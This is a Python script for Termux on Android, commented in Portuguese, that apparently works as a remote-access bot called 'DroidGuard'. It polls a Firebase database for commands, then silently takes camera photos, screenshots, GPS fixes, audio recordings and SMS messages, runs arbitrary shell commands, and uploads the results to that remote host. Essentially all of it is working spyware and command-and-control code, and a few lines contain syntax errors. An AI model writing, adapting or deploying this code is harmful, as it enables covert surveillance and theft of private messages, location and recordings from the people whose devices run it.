#!/data/data/com.termux/files/usr/bin/python
"""
DroidGuard Bot - Executor Remoto
Funciona em background, só morre com palavra mágica
"""
import os, sys, time, json, base64, subprocess, requests, hashlib, threading

# CONFIGURAÇÕES
FIREBASE_URL = "https://droidguard-10597-default-rtdb.firebaseio.com/"
PALAVRA_MAGICA = "avadakadabra"
ARQUIVO_MORTE = "/tmp/droidguard_morrer.txt"

device_id = hashlib.md5(os.uname().nodename.encode() + str(os.path.getsize("/system/build.prop")).encode()).hexdigest()[:8]

def verificar_morte():
    """Verifica se deve morrer (Avada Kedavra)"""
    if os.path.exists(ARQUIVO_MORTE):
        try:
            with open(ARQUIVO_MORTE, 'r') as f:
                if f.read().strip() == PALAVRA_MAGICA:
                    return True
        except:
            pass
    return False

def tirar_foto(tipo="front"):
    """Tira foto - tipo: front ou rear"""
    try:
        cam_id = "1" if tipo == "front" else "0"
        arquivo = f"/sdcard/droid_cam_{int(time.time())}.jpg"
        subprocess.run(f"termux-camera-photo -c {cam_id} {arquivo}", shell=True, timeout=10)
        if os.path.exists(arquivo):
            with open(arquivo, "rb") as f:
                foto = base64.b64encode(f.read()).decode()
            os.remove(arquivo)
            return foto
    except Exception as e:
        print(f"Erro foto: {e}")
    return None

def capturar_tela():
    """Captura a tela do dispositivo"""
    try:
        arquivo = f"/sdcard/droid_screen_{int(time.time())}.png"
        subprocess.run(f"termux-screenshot {arquivo}", shell=True, timeout=5)
        if os.path.exists(arquivo):
            with open(arquivo, "rb") as f:
                screen = base64.b64encode(f.read()).decode()
            os.remove(arquivo)
            return screen
    except Exception as e:
        print(f"Erro screenshot: {e}")
    return None

def obter_gps():
    """Obtém localização GPS"""
    try:
        result = subprocess.run("termux-location", shell=True, capture_output=True, text=True, timeout=15)
        if result.returncode == 0:
            dados = json.loads(result.stdout)
            return {
                "latitude": dados.get("latitude"),
                "longitude": dados.get("longitude"),
                "altitude": dados.get("altitude"),
                "precisao": dados.get("accuracy")
            }
    except Exception as e:
        print(f"Erro GPS: {e}")
    return None

def obter_bateria():
    """Obtém status da bateria"""
    try:
        result = subprocess.run("termux-battery-status", shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            return json.loads(result.stdout)
    except:
        pass
    return {"percentage": 0, "status": "desconhecido"}

def vibrar(duracao=1000):
    """Vibra o dispositivo"""
    try:
        subprocess.run(f"termux-vibrate -d {duracao}", shell=True, timeout=2)
        return True
    except:
        return False

def falar(texto):
    """Fala um texto no dispositivo"""
    try:
        subprocess.run(f'termux-tts-speak "{texto}"', shell=True, timeout=10)
        return True
    except:
        return False

def gravar_audio(duracao=10):
    """Grava áudio do microfone"""
    try:
        arquivo = f"/sdcard/droid_audio_{int(time.time())}.aac"
        subprocess.run(f"termux-microphone-record -f {arquivo} -d {duracao}", shell=True, timeout=duracao+5)
        if os.path.exists(arquivo):
            with open(arquivo, "rb") as f:
                audio = base64.b64encode(f.read()).decode()
            os.remove(arquivo)
            return audio
    except Exception as e:
        print(f"Erro áudio: {e}")
    return None

def listar_sms(limite=20):
    """Lista os últimos SMS"""
    try:
        result = subprocess.run(f"termux-sms-list -l {limite}", shell=True, capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            sms_list = json.loads(result.stdout)
            return [{"numero": s.get("number"), "texto": s.get("body")[:100], "data": s.get("received")} for s in sms_list]
    except:
        pass
    return []

def executar_shell(comando):
    """Executa comando shell remoto"""
    try:
        result = subprocess.run(comando, shell=True, capture_output=True, text=True, timeout=15)
        return {"stdout": result.stdout, "stderr": result.stderr, "codigo": result.returncode}
    except Exception as e:
        return {"stdout": "", "stderr": str(e), "codigo": -1}

def listar_arquivos(caminho="/sdcard"):
    """Lista arquivos de um diretório"""
    try:
        result = subprocess.run(f"ls -la {caminho}", shell=True, capture_output=True, text=True, timeout=10)
        return {"arquivos": result.stdout}
    except:
        return {"arquivos": "Erro ao listar"}

# Dicionário de comandos
COMANDOS = {
    "foto_frontal": lambda p: {"foto": tirar_foto("front")},
    "foto_traseria": lambda p: {"foto": tirar_foto("rear")},
    "screenshot": lambda p: {"screen": capturar_tela()},
    "gps": lambda p: obter_gps() or {"erro": "GPS indisponivel"},
    "bateria": lambda p: obter_bateria(),
    "vibrar": lambda p: {"status": "vibrou" if vibrar(p.get("duracao", 1000)) else "erro"},
    "falar": lambda p: {"status": "falou" if falar(p.get("texto", "")) else "erro"},
    "gravar_audio": lambda p: {"audio": gravar_audio(p.get("duracao", 10))},
    "listar_sms": lambda p: {"sms": listar_sms(p.get("limite", 20))},
    "shell": lambda p: executar_shell(p.get("cmd", "")),
    "listar_arquivos": lambda p: listar_arquivos(p.get("caminho", "/sdcard"))
}

def enviar_status(dados):
    """Envia status para o Firebase"""
    try:
        url = f"{FIREBASE_URL}/dispositivos/{device_id}.json"
        requests.patch(url, json=dados, timeout=5)
        return True
    except:
        return False

def processar_comandos():
    """Loop principal de processamento de comandos"""
    ultimo_comando = None
    
    while not verificar_morte():
        try:
            # Buscar comandos pendentes
            url = f"{FIREBASE_URL}/comandos/{device_id}.json"
            if ultimo_comando:
                url += f"?orderBy="timestamp"&startAt={ultimo_comando + 1}"
            
            resp = requests.get(url, timeout=20)
            
            if resp.status_code == 200 and resp.json():
                for cmd_id, comando in resp.json().items():
                    acao = comando.get("acao")
                    params = comando.get("params", {})
                    
                    print(f"🎯 Executando: {acao}")
                    
                    if acao in COMANDOS:
                        resultado = COMANDOS[acao](params)
                    else:
                        resultado = {"erro": f"Comando desconhecido: {acao}"}
                    
                    resultado["timestamp"] = time.time()
                    
                    # Enviar resultado
                    url_result = f"{FIREBASE_URL}/resultados/{device_id}/{cmd_id}.json"
                    requests.put(url_result, json=resultado, timeout=5)
                    
                    # Remover comando após executar
                    requests.delete(f"{FIREBASE_URL}/comandos/{device_id}/{cmd_id}.json")
                    
                    ultimo_comando = comando.get("timestamp", 0)
            
            # Enviar heartbeat a cada 30 segundos
            enviar_status({
                "status": "online",
                "ultimo_ping": time.time(),
                "bateria": obter_bateria().get("percentage", 0),
                "device_name": os.uname().nodename
            })
            
            time.sleep(5)
            
        except Exception as e:
            print(f"Erro no loop: {e}")
            time.sleep(10)
    
    # Morreu
    enviar_status({"status": "morto", "ultimo_ping": time.time()})
    print("💀 Bot morto pelo feitiço!")

def main():
    print("="*50)
    print("🛡️ DROIDGUARD BOT - PERSISTENTE")
    print("="*50)
    print(f"📱 Device ID: {device_id}")
    print(f"⚡ Para matar: echo '{PALAVRA_MAGICA}' > {ARQUIVO_MORTE}")
    print("="*50)
    
    # Registrar dispositivo
    enviar_status({
        "status": "online",
        "iniciado_em": time.time(),
        "bateria": obter_bateria().get("percentage", 0)
    })
    
    try:
        processar_comandos()
    except KeyboardInterrupt:
        print("
🛑 Bot interrompido")
        enviar_status({"status": "offline"})

if __name__ == "__main__":
    main()
